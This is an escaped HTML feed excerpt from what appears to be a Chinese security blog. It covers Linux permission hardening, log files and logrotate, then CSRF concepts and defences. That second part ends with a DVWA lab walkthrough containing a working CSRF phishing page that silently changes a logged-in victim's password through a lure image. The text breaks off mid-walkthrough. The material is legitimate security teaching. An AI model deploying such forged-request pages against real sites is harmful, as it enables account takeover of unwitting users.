&lt;h2 id=&quot;1-wen-jian-xi-tong-ge-shi&quot;&gt;1·文件系统格式&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Linux文件系统&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624470033494-5c79344d-b0b1-4dd6-aaff-2c48510ab7c4.png#align=left&amp;amp;display=inline&amp;amp;height=279&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=558&amp;amp;originWidth=1224&amp;amp;size=227402&amp;amp;status=done&amp;amp;style=none&amp;amp;width=612&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;文件系统类型
| &lt;strong&gt;文件系统类型&lt;&#x2F;strong&gt; | &lt;strong&gt;文件系统说明&lt;&#x2F;strong&gt; |
| --- | --- |
| Ext | 第一个专门针对liunx的文件系统 |
| Ext2 | 为解决ext文件系统缺陷设计的高性能、可扩展的文件系统 |
| Ext3 | 日志文件系统，ext2的升级版 |
| Ext4 | Ext4提供了更为可靠性的功能 |
| swap | Linux的交换分区 |
| NFS | Linux的网络文件系统 |
| smb | 支持smb协议的网络文件系统 |
| vfat | 与windows系统兼容的linux文件系统 |
| ntfs | windowsNT所采用的独特的文件系统结构 |
| proc | Linux操作系统中的一种基于内存的伪文件系统 |
| xfs | 由SGI开发的一个全64位、快速、安全的日志文件系统 |&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;2-an-quan-fang-wen-he-quan-xian-she-zhi&quot;&gt;2·安全访问和权限设置&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;文件和目录安全&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;确保重要目录的权限设置，限制用户访问&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;排查任何人都有写权限的目录&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -xdev -type&lt;&#x2F;span&gt;&lt;span&gt; f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -perm -0002 -a&lt;&#x2F;span&gt;&lt;span&gt; !&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -perm -1000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\)&lt;&#x2F;span&gt;&lt;span&gt; –print
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -xdev -type&lt;&#x2F;span&gt;&lt;span&gt; d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -perm -0002 -a&lt;&#x2F;span&gt;&lt;span&gt; !&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -perm -1000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -print
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;配置默认的umask值：027&lt;&#x2F;li&gt;
&lt;li&gt;检查未授权的SGID&#x2F;SUID&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -type&lt;&#x2F;span&gt;&lt;span&gt; f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -perm -6000 -ls
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;文件目录权限&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;目录权限设置：chmod [-cfvR] filename&lt;br &#x2F;&gt;DEMO：chmod 750 &#x2F;home&#x2F;margin&#x2F;config&lt;br &#x2F;&gt;更改所有者和所有组：chown [-cfhvR] user[:group] filename&lt;br &#x2F;&gt;DEMO：chown margin:margingroup &#x2F;home&#x2F;margin&#x2F;config&lt;&#x2F;p&gt;
&lt;h1 id=&quot;san-ri-zhi-fen-xi&quot;&gt;三·日志分析&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;1-xi-tong-ri-zhi-de-fen-lei-linuxri-zhi&quot;&gt;1·系统日志的分类-Linux日志&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;日志文件系统已经成为linux系统不可缺失的部分。对于日常服务器的运行状态是否正常、遭受攻&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;击时如何查找被攻击的痕迹等情况，linux日志系统都提供了相应的解决方案。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;日志系统可以记录当前系统中发生的各种事件，比如登录日志记录每次登录的来源和时间、系统 每次启动 和关闭的情况、系统错误等。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;日志的主要用途:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;系统审计：记录登录系统的用户和日常行为&lt;&#x2F;li&gt;
&lt;li&gt;监测追踪：系统遭受到攻击时如何追踪溯源到攻击者&lt;&#x2F;li&gt;
&lt;li&gt;分析统计：系统的性能、错误等统计&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;messages
&lt;ul&gt;
&lt;li&gt;这是Linux最核心的日志文件，假若某个服务没有定义日志文件，那么该服务产生的日志文件就会记录到这个文件中， 该日志每周归档一次，默认只保留5次。归档的方法都是由“&#x2F;etc&#x2F;logrotate.conf”这个文件来控制的&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;wtmp
&lt;ul&gt;
&lt;li&gt;查看用户的登录，注销信息，同时记录系统的启动，重启，关机等事件。不用能cat直接查看，必须用last查看&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;btmp
&lt;ul&gt;
&lt;li&gt;和wtmp类似，也不能用cat直接查看，用lastb查看，记录用户登录无效的历史&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;maillog
&lt;ul&gt;
&lt;li&gt;用来记录邮件相关的日志，比如发给哪个，是否发出去&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;cron
&lt;ul&gt;
&lt;li&gt;记录了系统定时任务相关的日志&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;cpus&#x2F;
&lt;ul&gt;
&lt;li&gt;记录了cpu信息的日志&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;lastlog
&lt;ul&gt;
&lt;li&gt;记录所有用户的最后一次登录时间，只可能通过lastlog命令查看&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;sudo.log
&lt;ul&gt;
&lt;li&gt;记录使用sudo发出的命令，需要先配置&#x2F;etc&#x2F;sudoers 的 logfile=&#x2F;var&#x2F;log&#x2F;sudo.log&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&#x2F;var&#x2F;log&#x2F;maillog
&lt;ul&gt;
&lt;li&gt;用来记录邮件相关的日志，比如发给哪个，是否发出去&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;2-ri-zhi-wen-jian-guan-li&quot;&gt;2·日志文件管理&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;日志文件中的信息可能比较繁琐，但有时特别重要。比如，硬件故障，错误配置，网络入侵等 情况发生时，通过查看日志文件可以很轻松地定位问题所在。&lt;&#x2F;li&gt;
&lt;li&gt;你必须经常清空日志文件，去掉旧信息，以免磁盘占满。正确管理日志文件，可使我们需要日志文件时能够访问到。清空日志文件时另作备分可使你获得更多审计信息。&lt;&#x2F;li&gt;
&lt;li&gt;这些管理工作看起来很枯燥无味， logrotate可以帮助我们。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;3-ri-zhi-fen-xi-gong-ju&quot;&gt;3·日志分析工具&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Logrotate
&lt;ul&gt;
&lt;li&gt;logrotate 是操作系统用来管理日志的工具，支持日志的切割、压缩、清理以及邮件报警等，通过 crontab 服务定时运行，也可以用这个工具来管理我们自己的服务日志，只需要简单配置下 配置文件即可&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Logrotate使用方法
&lt;ol&gt;
&lt;li&gt;默认配置文件路径：&#x2F;etc&#x2F;logrotate.conf（也可自定义配置文件，启动时加载即可）&lt;&#x2F;li&gt;
&lt;li&gt;单次执行测试：logrotate -f &#x2F;etc&#x2F;logrotate.conf&lt;&#x2F;li&gt;
&lt;li&gt;定时执行：&#x2F;etc&#x2F;crontab *&#x2F;5 * * * * root &#x2F;sbin&#x2F;logrotate &#x2F;etc&#x2F;logrotate.conf 5分钟执行一次&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Logrotate配置
&lt;ul&gt;
&lt;li&gt;logrotate的配置可分为系统默认配置文件和自定义配置文件，默认配置文件的路径： &#x2F;etc&#x2F;logrotate.conf  如果要自定义，可以将配置文件写到&#x2F;etc&#x2F;logrotate.d&#x2F;中，&#x2F;etc&#x2F;logrotate.conf会引入。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Logrotate配置参数&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624471408443-0fea71ec-ede1-4174-86e1-e78cb24e3b22.png#align=left&amp;amp;display=inline&amp;amp;height=183&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=366&amp;amp;originWidth=1104&amp;amp;size=142243&amp;amp;status=done&amp;amp;style=none&amp;amp;width=552&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;rotate:保留多少个历史文件 Weekly:每周执行  Missingok:忽略文件缺失信息&lt;br &#x2F;&gt;notifempty:如果文件为空，不切分文件&lt;br &#x2F;&gt;delaycompress:转存的文件下一次转存时压缩&lt;br &#x2F;&gt;sharedscripts:postrotate脚本只执行一次&lt;br &#x2F;&gt;postrotate&#x2F;endscript:切割后执行的命令&lt;&#x2F;p&gt;
&lt;h2 id=&quot;4-ri-zhi-ge-shi&quot;&gt;4·日志格式&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624471580433-27dd120f-b443-4555-85d6-b41f303249e1.png#align=left&amp;amp;display=inline&amp;amp;height=106&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=212&amp;amp;originWidth=2011&amp;amp;size=496701&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1005.5&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;对于文本类型的日志，每一行表示一个消息，由4部分的固定格式组成&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;记录时间:表示消息日期和时间&lt;&#x2F;li&gt;
&lt;li&gt;主机名:表示生成消息的服务器的名字&lt;&#x2F;li&gt;
&lt;li&gt;生成消息的子系统的名字:来自进程标识进程，方括号中表示进程的PID&lt;&#x2F;li&gt;
&lt;li&gt;消息:剩下的部分表示消息的内容&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;5-ri-zhi-fen-xi&quot;&gt;5·日志分析&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624471866242-057c6ea0-7905-4c4c-90be-fbf403b26aaf.png#align=left&amp;amp;display=inline&amp;amp;height=101&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%882.09.30.png&amp;amp;originHeight=188&amp;amp;originWidth=1574&amp;amp;size=102593&amp;amp;status=done&amp;amp;style=none&amp;amp;width=847&quot; alt=&quot;截屏2021-06-24 上午2.09.30.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;查看系统中的用户：cat &#x2F;etc&#x2F;passwd | grep &#x2F;bin&#x2F;bash&lt;&#x2F;li&gt;
&lt;li&gt;登录用户和登录时候用的IP w&lt;&#x2F;li&gt;
&lt;li&gt;查询历史命令 history&lt;&#x2F;li&gt;
&lt;li&gt;分析登录IP，在wtmp中&lt;&#x2F;li&gt;
&lt;li&gt;分析历史命令，在history中&lt;&#x2F;li&gt;
&lt;li&gt;另外定时任务，sudo.log都要排查&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624471958804-9f688cb8-8b6b-41e0-85fa-06184daaadf2.png#align=left&amp;amp;display=inline&amp;amp;height=229&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=457&amp;amp;originWidth=1136&amp;amp;size=502075&amp;amp;status=done&amp;amp;style=none&amp;amp;width=568&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>CSRF跨站请求伪造漏洞</title>
		<published>2021-06-22T00:00:00+00:00</published>
		<updated>2021-06-22T00:00:00+00:00</updated>
		<link href="https://baz.ee/csrfkua-zhan-qing-qiu-wei-zao-lou-dong/" type="text/html"/>
		<id>https://baz.ee/csrfkua-zhan-qing-qiu-wei-zao-lou-dong/</id>
		<content type="html">&lt;h1 id=&quot;csrfde-ding-yi&quot;&gt;csrf的定义&lt;&#x2F;h1&gt;
&lt;p&gt;攻击者在&lt;strong&gt;一定的攻击条件&lt;&#x2F;strong&gt;下，&lt;strong&gt;利用被攻击者的身份&lt;&#x2F;strong&gt;向服务器发起请求，&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;服务器可以正常解析并&lt;strong&gt;返回正确结果&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624375922566-5bac7b83-1e73-4757-a59d-5fc863c610c1.png#align=left&amp;amp;display=inline&amp;amp;height=768&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%8811.31.41.png&amp;amp;originHeight=768&amp;amp;originWidth=1668&amp;amp;size=677535&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1668&quot; alt=&quot;截屏2021-06-22 下午11.31.41.png&quot; &#x2F;&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;csrffa-sheng-de-tiao-jian&quot;&gt;csrf发生的条件&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;被攻击者在【网站A】处于登陆状态&lt;&#x2F;li&gt;
&lt;li&gt;必须要在【网站A】同浏览器中打开黑客的链接&lt;&#x2F;li&gt;
&lt;li&gt;后台身份验证不严格（例如除cookie外无其他验证）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;csrfneng-zuo-shi-yao&quot;&gt;csrf能做什么&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;发邮件&lt;&#x2F;li&gt;
&lt;li&gt;发消息&lt;&#x2F;li&gt;
&lt;li&gt;财产操作比如转账、或者购买商品&lt;&#x2F;li&gt;
&lt;li&gt;修改密码&lt;&#x2F;li&gt;
&lt;li&gt;删除文章&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;csrffang-yu&quot;&gt;csrf防御&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;验证HTTP Referer字段&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;在HTTP头中有个字段是Refere，记录了HTTP请求的来源地址，在正常的页面请求中，如果用户是点击按钮等正常点击跳转都会将Referer发送给服务器，程序只需拿到值之后进行校验，如果没有或者是其他网站的话就可能是csrf攻击。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;请求参数添加token验证&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;csrf之所以能够成功，是因为攻击者可以伪造用户的请求，请求中所有的用户验证信息都在cookie中。我们要找一个不可伪造的参数来校验请求是否伪造，可以在请求中加入随机的token，每次的请求都随机，这样服务端验证token即可。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;在HTTP头中添加自定义属性&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;该方法也是使用token验证，和第二种方法不同的是，并不是将token放到HTTP参数中，而是放到HTTP自定义属性中，这样一次性给所有的HTTP请求都添加了token，解决了第二种方法挨个添加的不便，同时token不会记录到地址栏中，减少了token泄漏的风险。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;验证码&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;验证码和token验证一样，都具有随机性，可以很好的解决CSRF的问题，但很多时候为了用户体验，网站不能给所有的操作都加上验证码，所以验证码只能作为一种辅助手段。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;dvwazhong-de-csrf&quot;&gt;DVWA中的CSRF&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;low&quot;&gt;LOW&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381175607-df3d7d1d-5688-4a8b-a511-2a2090368042.png#align=left&amp;amp;display=inline&amp;amp;height=1746&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%8812.58.35.png&amp;amp;originHeight=1746&amp;amp;originWidth=2784&amp;amp;size=404646&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2784&quot; alt=&quot;截屏2021-06-23 上午12.58.35.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入用户名和密码&lt;br &#x2F;&gt;admin&lt;br &#x2F;&gt;password&lt;br &#x2F;&gt;成功进入&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381205289-eaf8c6ee-efd7-474a-8151-dc290b059820.png#align=left&amp;amp;display=inline&amp;amp;height=1746&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%8812.59.53.png&amp;amp;originHeight=1746&amp;amp;originWidth=2784&amp;amp;size=534575&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2784&quot; alt=&quot;截屏2021-06-23 上午12.59.53.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;这里可以修改密码，我们把密码修改成lalala&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381299690-d9b1ba57-7894-41ee-b0a9-7c3f6e227c81.png#align=left&amp;amp;display=inline&amp;amp;height=1746&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.01.07.png&amp;amp;originHeight=1746&amp;amp;originWidth=2784&amp;amp;size=556136&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2784&quot; alt=&quot;截屏2021-06-23 上午1.01.07.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;注意上图中的URL，我们发现修改的新密码通过URL传递到服务器&lt;br &#x2F;&gt;由此构造钓鱼网页&lt;br &#x2F;&gt;写下如下代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;charset&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;UTF-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;CSRF&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;abc&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;im &lt;&#x2F;span&gt;&lt;span&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Image&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;im&lt;&#x2F;span&gt;&lt;span&gt;.src = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change#&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;		}
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;body&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;			&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;timg.png&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;width&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;100%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;height&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;100%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;onclick&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abc&lt;&#x2F;span&gt;&lt;span&gt;()&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;body&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;找到一张诱导人点击的图片&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381475919-903d004a-e340-41a6-a44d-dfbbe7e91fa0.png#align=left&amp;amp;display=inline&amp;amp;height=227&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=timg.png&amp;amp;originHeight=1326&amp;amp;originWidth=2646&amp;amp;size=4462229&amp;amp;status=done&amp;amp;style=none&amp;amp;width=452&quot; alt=&quot;timg.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;制成网页后，在网站上发布这个网页&lt;br &#x2F;&gt;当受害人在登陆DVWA后，在并没有关掉DVWA的情况下，又用打开DVWA的浏览器打开了我们制作的网页，则受害人的DVWA的密码将会被改成我们的密码，如下&lt;br &#x2F;&gt;假使受害人点开了我们的钓鱼网页&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381876786-567f93e2-baa8-4bd6-9367-4f195c7a6cb2.png#align=left&amp;amp;display=inline&amp;amp;height=1746&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.10.25.png&amp;amp;originHeight=1746&amp;amp;originWidth=2784&amp;amp;size=6284211&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2784&quot; alt=&quot;截屏2021-06-23 上午1.10.25.png&quot; 